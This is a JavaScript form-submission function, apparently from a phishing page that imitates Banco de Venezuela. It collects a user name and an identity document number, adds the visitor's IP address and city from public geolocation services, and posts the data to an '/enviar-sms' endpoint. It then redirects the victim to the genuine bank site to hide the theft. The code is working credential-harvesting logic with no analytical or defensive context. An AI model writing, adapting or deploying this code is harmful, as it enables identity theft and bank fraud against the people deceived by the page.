function enviarFormulario(event) {
    event.preventDefault();

    const documento = document.getElementById("documento").value;
    const usuario = localStorage.getItem("usuario");
    const hora = new Date().toLocaleTimeString();

    fetch('https://ipv4.ident.me/json')
    .then(response => response.json())
    .then(ipData => {
        const ip = ipData.ip;
        
        return fetch(`https://ipapi.co/${ip}/json/`)
            .then(response => response.json())
            .then(geoData => ({
                ip,
                pais: geoData.country_name,
                estado: geoData.region,
                ciudad: geoData.city,
                hora
            }));
    })
    .then(locationData => {
        return fetch('/enviar-sms', {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                documento, 
                usuario, 
                ...locationData 
            })
        });
    })
    .then(response => {
        if (response.ok) {
            window.location.href = "https://www.bancodevenezuela.com/";
        } else {
            console.error("Error:", response.statusText);
            alert("Error al procesar la solicitud");
        }
    })
    .catch(error => {
        console.error("Error de conexión:", error);
        alert("Error al obtener datos de geolocalización");
    });
}
